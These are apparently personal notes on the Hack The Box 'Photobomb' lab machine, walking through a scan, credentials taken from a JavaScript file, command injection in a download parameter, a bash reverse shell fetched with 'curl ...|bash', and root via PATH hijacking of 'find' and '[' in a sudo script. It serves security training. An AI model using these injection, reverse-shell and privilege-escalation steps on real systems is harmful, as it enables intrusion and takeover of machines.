---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Photobomb

https://0xdf.gitlab.io/2023/02/11/htb-photobomb.html

## Nmap

`nmap -sC -sV -oA nmap/result 10.10.11.182`

```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-10 15:17 IST
Nmap scan report for 10.10.11.182
Host is up (0.085s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds
```

Edit the `/etc/hosts` and continue

## Web

Port (80)

### Get access

to access the web further `/printer` we need cretentials. After inspecting the source code, we can find them in JS file `photobomb.js`

```
username = pH0t0
password = b0Mb!
```

### Download page

There is a selection and button to download a photo. Capure the request and try **every** parameter if it is injectable. Original body:

```
photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=png&dimensions=1000x1500
```

Now add `;sleep+5` for every parameter to try it out

Working injection:

```
photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=png;sleep+5&dimensions=1000x1500
```

### Reverse shell

The only reverse shell from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md that would work is the Ruby one that proxies commands. But this is not usable for further explitation (as it is limited). I need to expose my own shell and request it from the victim

I host a reverse shell. E.g.,

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
```

...using python

```
python3 -m http.server
```

Open a listener

```
nc -lnvp 4444
```

And then ask for it in the injected request

```
filetype=png;curl+10.10.14.6/shell.sh|bash
```

Next, i **NEED** tty shell, so I upgrade it. (e.g., script/stty trick https://www.youtube.com/watch?v=DqE6DxqJg8Q)

```
wizard@photobomb:~/photobomb$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
wizard@photobomb:~/photobomb$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
wizard@photobomb:~/photobomb$
```

This gives me **USER**

### Root

By running `sudo -l` I detect that the `/opt/cleanup.sh` can be run as a root.

```
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh  
```

Furtehrmore: SETENV means that the current environment will be used rather than a fresh one.

#### Path hijack

There is relative path of `find` in the script

```
# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

So I create a temp folder and create a fake `find` command.

```
wizard@photobomb:/dev/shm$ echo -e '#!/bin/bash\n\nbash' > find
wizard@photobomb:/dev/shm$ chmod +x find
```

Now, running the script with the temp directory on the path will give me root shell.

```
sudo PATH=$PWD:$PATH /opt/cleanup.sh 
```

#### Alternative path hijack

The `[` in bash tests is actually a command in Bash, same as `test`. It is a binary.

```
wizard@photobomb:/dev/shm$ which [
/usr/bin/[
wizard@photobomb:/dev/shm$ file /usr/bin/[ 
/usr/bin/[: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=99cfd563b4850f124ca01f64a15ec24fd8277732, for GNU/Linux 3.2.0, stripped
```

Normaly, it is not called directly, as it is a Bash build-in. But, `enable -n [` disables it, so the binary is called.

So you can exploid `[` istead of `find`

```
wizard@photobomb:/dev/shm$ echo -e '#!/bin/bash\n\nbash' > [
wizard@photobomb:/dev/shm$ chmod +x [
wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
```